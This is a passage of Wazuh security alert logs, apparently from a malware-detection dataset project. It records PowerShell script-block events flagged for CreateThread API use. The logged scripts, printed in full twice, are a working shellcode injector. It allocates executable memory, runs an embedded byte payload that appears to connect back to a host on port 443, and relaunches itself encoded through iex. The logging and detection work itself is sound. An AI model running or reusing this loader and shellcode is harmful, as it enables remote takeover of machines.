0x1000){$g = $z.Length};$6u5c=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($6u5c.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$6u5c,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"7f0126ac-256e-4be5-b35d-67b92cf216c7","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3845.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:42.695+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":193,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304502.4025725","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:03.0310411Z","eventRecordID":"145801","processID":"2032","threadID":"8664","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";$cmd = \"-nop -noni -enc \";iex \"& $x86 $cmd $e\"}else{$cmd = \"-nop -noni -enc\";iex \"& powershell $cmd $e\";}\r\n\r\nScriptBlock ID: 85f8ea41-b20b-4e4f-a43c-3d374325f196\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3849.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$1 = '$c = ''[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell\\\";$cmd = \\\"-nop -noni -enc \\\";iex \\\"&amp; $x86 $cmd $e\\\"}else{$cmd = \\\"-nop -noni -enc\\\";iex \\\"&amp; powershell $cmd $e\\\";}","scriptBlockId":"85f8ea41-b20b-4e4f-a43c-3d374325f196","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3849.ps1"}}},"location":"EventChannel"}
